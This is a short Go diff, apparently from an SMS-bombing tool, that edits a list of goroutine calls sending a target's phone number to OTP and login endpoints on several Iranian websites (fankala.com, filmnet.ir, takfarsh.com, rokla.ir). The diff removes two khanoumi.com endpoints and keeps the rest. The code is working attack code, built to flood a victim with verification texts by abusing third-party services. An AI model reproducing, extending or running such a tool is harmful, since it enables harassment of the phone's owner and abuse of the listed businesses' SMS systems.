@@ -293,10 +293,7 @@ func main() {
 		}, ch)    // add site
 		go sms("https://fankala.com/wp-admin/admin-ajax.php", map[string]interface{}{
 			"mobileNo": phone,
-		}, ch)    // add site
-		go sms("https://www.khanoumi.com/accounts/sendotp", map[string]interface{}{
-			"mobile": phone,
-		}, ch)  
+		}, ch)    // add site 
 		go sms("https://filmnet.ir/api-v2/access-token/users/0{phone}/otp", map[string]interface{}{
 			"otp:login": phone,
 		}, ch)  
@@ -386,9 +383,6 @@ func main() {
 		}, ch)  // edit :4/22/2025
 		go sms("https://takfarsh.com/wp-admin/admin-ajax.php", map[string]interface{}{
 			"username": phone,
-		}, ch)  // edit :4/22/2025
-		go sms("https://accounts.khanoumi.com/account/login/init", map[string]interface{}{
-			"loginIdentifier": phone,
 		}, ch)  // edit :4/22/2025
 		go sms("https://api.rokla.ir/user/request/otp/", map[string]interface{}{
 			"mobile": phone,
